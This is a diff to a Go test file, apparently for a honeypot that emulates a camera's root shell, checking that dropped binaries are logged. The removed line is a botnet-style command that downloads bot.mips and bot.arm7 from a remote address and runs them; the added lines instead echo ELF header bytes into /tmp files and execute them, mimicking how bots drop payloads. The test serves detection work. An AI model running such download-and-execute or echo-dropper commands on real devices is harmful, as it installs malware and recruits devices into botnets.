@@ -79,7 +79,9 @@ func TestDownloadsAreLogged(t *testing.T) {
 
 func TestDroppedBinariesAreLogged(t *testing.T) {
 	s := shelltest.New(t, "root")
-	s.Run("cd /tmp; wget -q http://198.51.100.7/bot.mips; wget -q http://198.51.100.7/bot.arm7; chmod +x bot.*; ./bot.mips; ./bot.arm7")
+	// Downloads fail on the camera (see net.go), so bots echo binaries in.
+	s.Run(`cd /tmp; printf '\177ELF\001\002\001\000\000\000\000\000\000\000\000\000\000\002\000\010' > bot.mips`)
+	s.Run(`printf '\177ELF\001\001\001\000\000\000\000\000\000\000\000\000\002\000\050\000' > bot.arm7; chmod +x bot.*; ./bot.mips; ./bot.arm7`)
 	ev := s.Events("exec_binary")
 	if len(ev) != 2 {
 		t.Fatalf("exec_binary events: %v", ev)
